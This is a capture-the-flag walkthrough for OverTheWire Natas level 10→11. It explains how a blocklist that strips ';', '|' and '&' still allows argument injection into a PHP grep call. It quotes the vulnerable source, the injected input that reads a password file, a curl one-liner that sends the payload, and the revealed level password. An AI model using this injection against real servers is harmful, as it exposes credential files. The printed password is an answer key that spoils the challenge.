# Natas Level 10 → 11

## Goal

Same search-box command injection as the previous level, but this time the PHP strips `;`, `|`, and `&` from your input. You can't chain a new command — but you **can** sneak the password file into grep's argument list as a *file to be grep'd*.

## Concepts you'll learn

- Defence-in-depth: blocklists are hard to get right, and attackers think laterally
- `grep`'s argument list: `grep PATTERN file1 file2 file3 ...` greps multiple files and prints the matching lines (with filename prefix if >1 file)
- Using a pattern that matches anything (like `.*`) to dump the whole file

## Walkthrough

### 1. View the source

```php
$key = $_REQUEST["needle"];

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

`;`, `|`, `&` are filtered. We can still add **more arguments** to `grep`, though — whitespace isn't filtered, and `grep` doesn't care how many files you give it.

### 2. Think like grep

We want `grep` to print the password file. `grep PATTERN FILE` prints every line in `FILE` matching `PATTERN`. If PATTERN is `.*` (regex: "anything"), every line matches.

So if we submit:

```
.* /etc/natas_webpass/natas11
```

The server runs:

```
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```

Grep now greps **both files** for the pattern `.*`. Every line in `/etc/natas_webpass/natas11` matches (it's a single line containing the password), and every line of the dictionary matches too. The output includes:

```
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:apple
dictionary.txt:banana
...
```

### 3. (Alternative) Curl

```bash
$ curl -u natas10:<pass> --data-urlencode "needle=.* /etc/natas_webpass/natas11" \
       http://natas10.natas.labs.overthewire.org/index.php | grep -oE '[A-Za-z0-9]{32}' | head -1
```

## The answer

The password for `natas11` is:

**`U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas10.natas.labs.overthewire.org/>
